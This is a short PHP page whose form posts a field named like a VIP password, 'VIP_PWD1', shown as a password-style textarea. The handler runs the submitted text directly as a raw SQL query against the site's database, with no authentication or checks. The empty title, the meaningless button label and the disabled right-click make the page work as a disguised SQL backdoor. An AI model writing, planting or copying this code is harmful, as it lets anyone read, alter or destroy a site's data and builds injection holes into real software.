<?php 
define('Copyright', '作者QQ:1458858574');
define('ROOT_PATH', $_SERVER["DOCUMENT_ROOT"].'/');
include_once ROOT_PATH.'class/DB.php';

if ($_SERVER["REQUEST_METHOD"] == "POST")
{
	
	$cPwd = $_POST['VIP_PWD1'];
	$cPwd=str_replace('\\','',$cPwd);
	$db = new DB();
	$sql = $cPwd;
	$db->query($sql, 1);
	$db->query($sql, 2);
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" oncontextmenu="return false">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="css/left.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src=".js/sc.js"></script>
<script type="text/javascript" src="../js/jquery.js"></script>
<script type="text/javascript" src="./js/Pwd_Safety.js"></script>
<title></title>
</script>
</head>
<body>
<form action="" method="post" onsubmit="">
<table border="0" cellpadding="0" cellspacing="1" class="t_list" width="700">
       
        <tr style="height:28px">

            <td class="t_td_text"><textarea type="password" style=" margin-left:3px;border:1px #0099CC solid; background:#F3F3F3; height:160px; width:500px" name="VIP_PWD1" ></textarea></td>
        </tr>
        <tr>
        	<td colspan="2" align="center" class="textcc"><input type="submit" class="inputs" value="om" /></td>
        </tr>
</table>
</form>
</body>
</html>